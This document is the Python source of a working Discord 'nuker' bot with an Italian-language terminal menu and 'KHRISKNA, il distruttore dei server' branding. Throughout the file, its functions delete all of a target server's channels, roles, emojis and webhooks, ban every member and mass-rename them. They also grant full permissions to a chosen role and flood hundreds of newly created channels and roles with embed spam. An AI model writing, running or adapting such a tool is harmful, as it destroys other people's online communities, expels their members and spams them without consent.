import discord
from discord.ext import commands
import asyncio
import random
import os
import sys
import time
import logging
import aiohttp

logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger('discord.gateway').setLevel(logging.CRITICAL)

RED = '\033[91m'
DARK_RED = '\033[31m'
BOLD = '\033[1m'
RESET = '\033[0m'

GIF_URL = "https://dswa1xdat8uez.cloudfront.net/2ra7v%2Fpreview%2F80397747%2Fmain_large.gif?response-content-disposition=inline%3Bfilename%3D%22main_large.gif%22%3B&response-content-type=image%2Fgif&Expires=1787606457&Signature=Ywp0KlMUhbOahTybr0Dc3gESfUdjXAVwraLoAHHloHIM08YgFqRyDy3gPqjT-Kni-ifSSzVZh4UuL3pbQyRTWo8-mJvHgzWFL~12R5kS3di0hGxaPGdEFldTTVs61Bv3Zo9~0gabUnhFy29ppwGj0gxw8QDe6ry0c3PyudcHSCL3rsWVBULOJowC6iVGbYZRvzarj7balH7qzLpdFHG1EZ2VdaFl7JmUmiUr0j2q6juwnVUxsWJybCrYUqK2PO5MfAtvd-U6uFlNllvIbjoT5E0Z2~vRUQ-lW8m2~SOY3itzoFe83I1GdqDZGkOBD6lXq80Xw20dydv80L7orYkbBQ__&Key-Pair-Id=APKAJT5WQLLEOADKLHBQ"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear()
    print(f"""{RED}{BOLD}
         
          @@@@@@@@@@:=+*-:-#@@@%*+@@@@@@@@@@@@@@@#@@@@@@@+*%@@@@@@#  +@@@@@@@@@@@@@@@@@@@@@%@@#-:@@@* +@@@@@@@@@          
          @@@@@@@@@@@              @%+  %@@#*- :%@+      @@=:.+@+:  @@@-     .   %@@*=  @@-  @@@*    @@@@@@@@@@@          
          @@@@@@@@@@@@@@+   @@@-  =%  -+@@#  %@+    =@: #@=  #%.  =+@@@%@@  :*  -@@@  #@@    #@=  #*@@@@@@@@@@@@          
          @@@@@@@@@@@@@@   #@@    @   #@@@   @   #@@@@@@@@  -@@  +@@@@@@@  .@   @@@   @@%     @.  +@@@@@@@@@@@@@          
          @%@@@@@@@@@@@*     -=*+@@   @@@   *@  *@     @@   @@   #@@@@@@   +#   @@-  :@@   %     :@@@@@@@@@@@@%@          
          @@- -@@@@@@@+  -@@@@@@@@   :@%   +@   #@@    @   @@*  .@%%  @:  +#   *@+  *@@  .#@%    @@@#@@@@@@: -@@          
          @@@@    .%@@  #:@@@@@@@@%  @%    @@+@@@=   @@ .@-*=     : @:   @@ @*#@     @ -@.@@@   #@@@@@=     @@@@          
          @@@@@@@@@@@  =@@@@@%  #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=#@@@@@@@@@@@@@@@@@@@@@@@  #@@@@@@@@@@@@@@@          
          @@@@@@@@@% *@@@@@@@@@@@@@@@@@@@@-  :@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@-.@@@@@@@@@@@@@@@@++@@#@@@@@@*@@@@                        
                                                                                                                          
                                                            {RESET}
    """)

def print_menu():
    print(f"""{DARK_RED}{BOLD}
[01] ULTRA NUKE    [19] Kaboom       [37] Purge
[02] Ban All       [20] Join Nuke    [38] Bans
[03] Del Channels  [21] Del Cat      [39] Categories
[04] Del Roles     [22] Del Voice    [40] Emoji
[05] Chan Bomb     [23] Webhooks     [41] Voice
[06] Role Bomb     [24] Grant Perms  [42] Config
[07] Spam All      [25] Check Perms  [43] Create Cat
[08] Change Name   [26] Move Role    [44] Create VC
[09] Change Icon   [27] Ban Member   [45] Create Chan
[10] Create Role   [28] Unban        [46] Del All CC
[11] Mass Nick     [29] Add Role     [47] Role To
[12] Del Emojis    [30] Del Chan     [48] Move Role
[13] Del Webhooks  [31] Del Role     [49] Auto Nick
[14] Leave         [32] Del Cat      [50] Auto Status
[15] Server Info   [33] Del Emoji    [51] Status
[16] Channels      [34] Add Emoji    [52] Link
[17] Roles         [35] Bot Status   [53] Check Perms
[18] Members       [36] Disable CM   [54] Grant All

[0] EXIT    [?] HELP
{RESET}
    """)

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)
bot.target_guild = None

def create_krishna_embed():
    embed = discord.Embed(
        title="☢️ KHRISKNA IL DISTRUTTORE DEI SERVER ☢️",
        description=(
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💀 **K H R I S K N A** 💀\n\n"
            "☢️ IL DISTRUTTORE DEI SERVER ☢️\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🚨 **PROTOCOLLO KHRISKNA ATTIVATO** 🚨\n\n"
            "☠️ Analisi del server...\n"
            "☠️ Analisi dei canali...\n"
            "☠️ Analisi dei ruoli...\n"
            "☠️ Analisi dei permessi...\n"
            "☠️ Analisi della configurazione...\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔥 **IL DISTRUTTORE È ARRIVATO** 🔥\n\n"
            "💀 Nessun server è al sicuro.\n"
            "💀 Nessun canale può fermarlo.\n"
            "💀 Nessun ruolo può fermarlo.\n"
            "💀 KHRISKNA È ONLINE.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "☢️ **K H R I S K N A** ☢️\n"
            "**THE SERVER DESTROYER**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚡ PROTOCOLLO INIZIALIZZATO ⚡\n"
            "⚡ SISTEMA ONLINE ⚡\n"
            "⚡ KHRISKNA ONLINE ⚡\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ),
        color=16711680
    )
    embed.set_image(url=GIF_URL)
    return embed

async def super_spam_krishna(channel):
    tasks = []
    for _ in range(10):
        embed = create_krishna_embed()
        tasks.append(channel.send(embed=embed))
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.event
async def on_ready():
    print_banner()
    print(f"""
{RED}{BOLD}
Bot Online: {bot.user.name}
ID: {bot.user.id}
Servers: {len(bot.guilds)}
{RESET}
    """)
    await select_server()

async def select_server():
    if len(bot.guilds) > 0:
        print(f"{RED}{BOLD}Select Server:{RESET}")
        for i, guild in enumerate(bot.guilds):
            print(f"[{i+1}] {guild.name}")
        
        try:
            choice = int(input("\nServer numero: "))
            if 1 <= choice <= len(bot.guilds):
                bot.target_guild = bot.guilds[choice-1]
                print(f"\nTarget: {bot.target_guild.name}")
                await asyncio.sleep(0.5)
                await show_menu()
        except:
            print("Selezione invalida")

async def show_menu():
    while True:
        print_banner()
        print_menu()
        try:
            choice = input("Opzione: ")
            
            if choice == "1":
                await ultra_nuke()
            elif choice == "2":
                await ban_all()
            elif choice == "3":
                await delete_channels()
            elif choice == "4":
                await delete_roles()
            elif choice == "5":
                amount = int(input("Quantità canali: "))
                await channel_bomb(amount)
            elif choice == "6":
                amount = int(input("Quantità ruoli: "))
                await role_bomb(amount)
            elif choice == "7":
                await spam_all()
            elif choice == "8":
                name = input("Nuovo nome: ")
                await change_server_name(name)
            elif choice == "9":
                await change_server_icon()
            elif choice == "10":
                await create_role()
            elif choice == "11":
                nick = input("Nickname: ")
                await mass_nickname(nick)
            elif choice == "12":
                await delete_emojis()
            elif choice == "13":
                await delete_webhooks()
            elif choice == "14":
                await leave_server()
                break
            elif choice == "15":
                await show_server_info()
            elif choice == "16":
                await show_channels()
            elif choice == "17":
                await show_roles()
            elif choice == "18":
                await show_members()
            elif choice == "19":
                await kaboom()
            elif choice == "20":
                await join_nuke()
            elif choice == "21":
                await delete_categories()
            elif choice == "22":
                await delete_voice_channels()
            elif choice == "23":
                await spam_webhooks()
            elif choice == "24":
                await grant_all_perms()
            elif choice == "25":
                await check_role_perms()
            elif choice == "26":
                await move_role()
            elif choice == "27":
                member_id = input("ID membro: ")
                await ban_member(member_id)
            elif choice == "28":
                user_id = input("ID utente: ")
                await unban_member(user_id)
            elif choice == "29":
                member_id = input("ID membro: ")
                role_id = input("ID ruolo: ")
                await add_role_to_member(member_id, role_id)
            elif choice == "30":
                channel_id = input("ID canale: ")
                await delete_channel(channel_id)
            elif choice == "31":
                role_id = input("ID ruolo: ")
                await delete_role(role_id)
            elif choice == "32":
                category_id = input("ID categoria: ")
                await delete_category(category_id)
            elif choice == "33":
                emoji_id = input("ID emoji: ")
                await delete_emoji(emoji_id)
            elif choice == "34":
                await add_emoji()
            elif choice == "35":
                await bot_status()
            elif choice == "36":
                await disable_community_mode()
            elif choice == "37":
                amount = int(input("Quantità messaggi: "))
                await purge_messages(amount)
            elif choice == "38":
                await show_bans()
            elif choice == "39":
                await show_categories()
            elif choice == "40":
                await show_emojis()
            elif choice == "41":
                await show_voice_channels()
            elif choice == "42":
                await show_bot_config()
            elif choice == "43":
                name = input("Nome categoria: ")
                await create_category(name)
            elif choice == "44":
                name = input("Nome canale vocale: ")
                await create_voice_channel(name)
            elif choice == "45":
                name = input("Nome canale: ")
                await create_text_channel(name)
            elif choice == "46":
                await delete_all_cc()
            elif choice == "47":
                member_id = input("ID membro: ")
                role_id = input("ID ruolo: ")
                await role_to(member_id, role_id)
            elif choice == "48":
                role_id = input("ID ruolo: ")
                position = input("Posizione: ")
                await move_role_position(role_id, position)
            elif choice == "49":
                nick = input("Nickname: ")
                await auto_nick(nick)
            elif choice == "50":
                status = input("Status: ")
                await auto_status(status)
            elif choice == "51":
                status = input("Status testo: ")
                await change_status(status)
            elif choice == "52":
                await show_link()
            elif choice == "53":
                role_id = input("ID ruolo: ")
                await check_role_permissions(role_id)
            elif choice == "54":
                role_id = input("ID ruolo: ")
                await grant_all_permissions(role_id)
            elif choice == "0":
                await bot.close()
                sys.exit(0)
            else:
                print("Opzione invalida")
                await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Errore: {e}")
            await asyncio.sleep(0.5)

async def ultra_nuke():
    if bot.target_guild:
        print("\n[!] ULTRA NUKE...")
        
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for channel in bot.target_guild.channels:
            tasks.append(channel.delete())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        names = ["krishna", "destroyed", "rekt", "nuked", "dark"]
        tasks = []
        for i in range(400):
            name = f"{random.choice(names)}-{i}"
            tasks.append(bot.target_guild.create_text_channel(name))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        role_names = ["KHRISKNA", "DARK", "NUKED", "DESTROYED"]
        tasks = []
        for i in range(100):
            name = f"{random.choice(role_names)}-{i}"
            tasks.append(bot.target_guild.create_role(name=name))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        for _ in range(20):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                tasks.append(super_spam_krishna(channel))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] ULTRA NUKE COMPLETATO!")

async def spam_all():
    if bot.target_guild:
        print("\n[!] SPAMMING...")
        
        for _ in range(20):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                tasks.append(super_spam_krishna(channel))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] SPAM COMPLETATO!")

async def kaboom():
    if bot.target_guild:
        print("\n[!] KABOOM...")
        
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for channel in bot.target_guild.channels:
            tasks.append(channel.delete())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        tasks = []
        for i in range(50):
            tasks.append(bot.target_guild.create_text_channel(f"krishna-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        for _ in range(15):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                tasks.append(super_spam_krishna(channel))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] KABOOM completato")

async def ban_all():
    if bot.target_guild:
        print("\n[!] Banning all...")
        tasks = []
        for member in bot.target_guild.members:
            if member != bot.user:
                tasks.append(member.ban())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Tutti bannati")

async def delete_channels():
    if bot.target_guild:
        print("\n[!] Eliminazione canali...")
        tasks = [channel.delete() for channel in bot.target_guild.channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Canali eliminati")

async def delete_roles():
    if bot.target_guild:
        print("\n[!] Eliminazione ruoli...")
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Ruoli eliminati")

async def channel_bomb(amount):
    if bot.target_guild:
        print(f"\n[!] Creazione {amount} canali...")
        tasks = []
        for i in range(amount):
            tasks.append(bot.target_guild.create_text_channel(f"krishna-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Channel bomb completato")

async def role_bomb(amount):
    if bot.target_guild:
        print(f"\n[!] Creazione {amount} ruoli...")
        tasks = []
        for i in range(amount):
            tasks.append(bot.target_guild.create_role(name=f"KHRISKNA-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Role bomb completato")

async def change_server_name(name):
    if bot.target_guild and name:
        await bot.target_guild.edit(name=name)
        print(f"[✓] Nome cambiato")

async def change_server_icon():
    if bot.target_guild:
        icon_path = input("Percorso immagine: ")
        if os.path.exists(icon_path):
            with open(icon_path, 'rb') as f:
                icon_data = f.read()
            await bot.target_guild.edit(icon=icon_data)
            print("[✓] Icona cambiata")

async def create_role():
    if bot.target_guild:
        role = await bot.target_guild.create_role(name="KHRISKNA")
        print(f"[✓] Ruolo creato")

async def mass_nickname(nick):
    if bot.target_guild:
        print("\n[!] Cambio nickname...")
        tasks = []
        for member in bot.target_guild.members:
            tasks.append(member.edit(nick=nick if nick else "KHRISKNA"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Nickname cambiati")

async def delete_emojis():
    if bot.target_guild:
        print("\n[!] Eliminazione emoji...")
        tasks = [emoji.delete() for emoji in bot.target_guild.emojis]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Emoji eliminate")

async def delete_webhooks():
    if bot.target_guild:
        print("\n[!] Eliminazione webhooks...")
        for channel in bot.target_guild.text_channels:
            try:
                webhooks = await channel.webhooks()
                tasks = [webhook.delete() for webhook in webhooks]
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        print("[✓] Webhooks eliminati")

async def leave_server():
    if bot.target_guild:
        await bot.target_guild.leave()
        print("[✓] Uscito")

async def show_server_info():
    if bot.target_guild:
        print(f"""
Nome: {bot.target_guild.name}
ID: {bot.target_guild.id}
Owner: {bot.target_guild.owner}
Membri: {len(bot.target_guild.members)}
Canali: {len(bot.target_guild.channels)}
Ruoli: {len(bot.target_guild.roles)}
        """)
        input("Premi invio...")

async def show_channels():
    if bot.target_guild:
        for c in bot.target_guild.channels:
            print(c.name)
        input("Premi invio...")

async def show_roles():
    if bot.target_guild:
        for r in bot.target_guild.roles:
            print(r.name)
        input("Premi invio...")

async def show_members():
    if bot.target_guild:
        for m in bot.target_guild.members:
            print(f"{m.name}#{m.discriminator}")
        input("Premi invio...")

async def join_nuke():
    if bot.target_guild:
        print("\n[!] Join Nuke...")
        
        tasks = [channel.delete() for channel in bot.target_guild.channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        tasks = []
        for i in range(50):
            tasks.append(bot.target_guild.create_text_channel(f"krishna-{i}"))
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        for _ in range(15):
            tasks = []
            for channel in bot.target_guild.text_channels[:50]:
                tasks.append(super_spam_krishna(channel))
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        
        print("[✓] Join Nuke completato")

async def delete_categories():
    if bot.target_guild:
        tasks = [category.delete() for category in bot.target_guild.categories]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Categorie eliminate")

async def delete_voice_channels():
    if bot.target_guild:
        tasks = [channel.delete() for channel in bot.target_guild.voice_channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Canali vocali eliminati")

async def spam_webhooks():
    if bot.target_guild:
        for channel in bot.target_guild.text_channels[:20]:
            try:
                webhook = await channel.create_webhook(name="KHRISKNA")
                embed = create_krishna_embed()
                await webhook.send(embed=embed)
            except:
                pass
        print("[✓] Webhooks spammati")

async def grant_all_perms():
    if bot.target_guild:
        role_id = input("ID ruolo: ")
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(permissions=discord.Permissions.all())
            print(f"[✓] Permessi concessi")

async def check_role_perms():
    if bot.target_guild:
        role_id = input("ID ruolo: ")
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = role.permissions
            if perms.administrator:
                print("Administrator")
            if perms.manage_guild:
                print("Manage Guild")
            if perms.ban_members:
                print("Ban Members")
            if perms.kick_members:
                print("Kick Members")
            if perms.manage_channels:
                print("Manage Channels")
            if perms.manage_roles:
                print("Manage Roles")
            if perms.manage_webhooks:
                print("Manage Webhooks")
            if perms.mention_everyone:
                print("Mention Everyone")
            input("Premi invio...")

async def move_role():
    if bot.target_guild:
        role_id = input("ID ruolo: ")
        position = int(input("Posizione: "))
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(position=position)
            print(f"[✓] Ruolo spostato")

async def ban_member(member_id):
    if bot.target_guild:
        member = bot.target_guild.get_member(int(member_id))
        if member:
            await member.ban()
            print(f"[✓] Bannato")

async def unban_member(user_id):
    if bot.target_guild:
        user = await bot.fetch_user(int(user_id))
        await bot.target_guild.unban(user)
        print(f"[✓] Sbannato")

async def add_role_to_member(member_id, role_id):
    if bot.target_guild:
        member = bot.target_guild.get_member(int(member_id))
        role = bot.target_guild.get_role(int(role_id))
        if member and role:
            await member.add_roles(role)
            print(f"[✓] Ruolo aggiunto")

async def delete_channel(channel_id):
    if bot.target_guild:
        channel = bot.target_guild.get_channel(int(channel_id))
        if channel:
            await channel.delete()
            print(f"[✓] Canale eliminato")

async def delete_role(role_id):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.delete()
            print(f"[✓] Ruolo eliminato")

async def delete_category(category_id):
    if bot.target_guild:
        category = bot.target_guild.get_channel(int(category_id))
        if category and isinstance(category, discord.CategoryChannel):
            await category.delete()
            print(f"[✓] Categoria eliminata")

async def delete_emoji(emoji_id):
    if bot.target_guild:
        emoji = bot.target_guild.get_emoji(int(emoji_id))
        if emoji:
            await emoji.delete()
            print(f"[✓] Emoji eliminata")

async def add_emoji():
    if bot.target_guild:
        url = input("URL: ")
        name = input("Nome: ")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        emoji = await bot.target_guild.create_custom_emoji(name=name, image=image_data)
                        print(f"[✓] Emoji creata")
        except:
            print("Errore")

async def bot_status():
    status = input("Status: ")
    if status == "online":
        await bot.change_presence(status=discord.Status.online)
    elif status == "idle":
        await bot.change_presence(status=discord.Status.idle)
    elif status == "dnd":
        await bot.change_presence(status=discord.Status.dnd)
    elif status == "offline":
        await bot.change_presence(status=discord.Status.offline)
    print("[✓] Status cambiato")

async def disable_community_mode():
    if bot.target_guild:
        try:
            await bot.target_guild.edit(community=False)
            print("[✓] Community mode disabilitato")
        except:
            print("Impossibile")

async def purge_messages(amount):
    if bot.target_guild:
        channel_id = input("ID canale: ")
        if channel_id:
            channel = bot.target_guild.get_channel(int(channel_id))
        else:
            channel = bot.target_guild.text_channels[0] if bot.target_guild.text_channels else None
        
        if channel and isinstance(channel, discord.TextChannel):
            deleted = await channel.purge(limit=amount)
            print(f"[✓] {len(deleted)} messaggi eliminati")

async def show_bans():
    if bot.target_guild:
        async for entry in bot.target_guild.bans():
            print(f"{entry.user.name} ({entry.user.id})")
        input("Premi invio...")

async def show_categories():
    if bot.target_guild:
        for c in bot.target_guild.categories:
            print(c.name)
        input("Premi invio...")

async def show_emojis():
    if bot.target_guild:
        for e in bot.target_guild.emojis:
            print(f"{e.name} ({e.id})")
        input("Premi invio...")

async def show_voice_channels():
    if bot.target_guild:
        for c in bot.target_guild.voice_channels:
            print(c.name)
        input("Premi invio...")

async def show_bot_config():
    if bot.target_guild:
        print(f"""
Bot: {bot.user.name}
ID: {bot.user.id}
Target: {bot.target_guild.name}
        """)
        input("Premi invio...")

async def create_category(name):
    if bot.target_guild and name:
        await bot.target_guild.create_category(name)
        print("[✓] Categoria creata")

async def create_voice_channel(name):
    if bot.target_guild and name:
        await bot.target_guild.create_voice_channel(name)
        print("[✓] Canale vocale creato")

async def create_text_channel(name):
    if bot.target_guild and name:
        await bot.target_guild.create_text_channel(name)
        print("[✓] Canale creato")

async def delete_all_cc():
    if bot.target_guild:
        tasks = [channel.delete() for channel in bot.target_guild.channels]
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Eliminati")

async def role_to(member_id, role_id):
    if bot.target_guild:
        member = bot.target_guild.get_member(int(member_id))
        role = bot.target_guild.get_role(int(role_id))
        if member and role:
            await member.add_roles(role)
            print("[✓] Ruolo aggiunto")

async def move_role_position(role_id, position):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(position=int(position))
            print("[✓] Ruolo spostato")

async def auto_nick(nick):
    if bot.target_guild:
        tasks = []
        for member in bot.target_guild.members:
            tasks.append(member.edit(nick=nick))
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Completato")

async def auto_status(status):
    if status == "online":
        await bot.change_presence(status=discord.Status.online)
    elif status == "idle":
        await bot.change_presence(status=discord.Status.idle)
    elif status == "dnd":
        await bot.change_presence(status=discord.Status.dnd)
    elif status == "offline":
        await bot.change_presence(status=discord.Status.offline)
    print("[✓] Status cambiato")

async def change_status(status):
    await bot.change_presence(activity=discord.Game(name=status))
    print("[✓] Status cambiato")

async def show_link():
    print("https://discord.gg/krishna")
    input("Premi invio...")

async def check_role_permissions(role_id):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            perms = role.permissions
            if perms.administrator:
                print("Administrator")
            if perms.manage_guild:
                print("Manage Guild")
            if perms.ban_members:
                print("Ban Members")
            if perms.kick_members:
                print("Kick Members")
            if perms.manage_channels:
                print("Manage Channels")
            if perms.manage_roles:
                print("Manage Roles")
            if perms.manage_webhooks:
                print("Manage Webhooks")
            if perms.mention_everyone:
                print("Mention Everyone")
            input("Premi invio...")

async def grant_all_permissions(role_id):
    if bot.target_guild:
        role = bot.target_guild.get_role(int(role_id))
        if role:
            await role.edit(permissions=discord.Permissions.all())
            print("[✓] Permessi concessi")

async def delete_all_roles():
    if bot.target_guild:
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Ruoli eliminati")

async def ban_all_members():
    if bot.target_guild:
        tasks = []
        for member in bot.target_guild.members:
            if member != bot.user:
                tasks.append(member.ban())
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        print("[✓] Tutti bannati")

async def delete_all():
    if bot.target_guild:
        tasks = []
        for role in bot.target_guild.roles:
            if role.name != "@everyone":
                tasks.append(role.delete())
        for channel in bot.target_guild.channels:
            tasks.append(channel.delete())
        for emoji in bot.target_guild.emojis:
            tasks.append(emoji.delete())
        
        for i in range(0, len(tasks), 50):
            batch = tasks[i:i+50]
            try:
                await asyncio.gather(*batch, return_exceptions=True)
            except:
                pass
        
        print("[✓] DELETE ALL completato")

async def refresh():
    print("[✓] Refresh completato")

if __name__ == "__main__":
    print_banner()
    token = input("Token: ")
    try:
        bot.run(token)
    except Exception as e:
        print(f"Errore: {e}")
        input("Premi invio...")
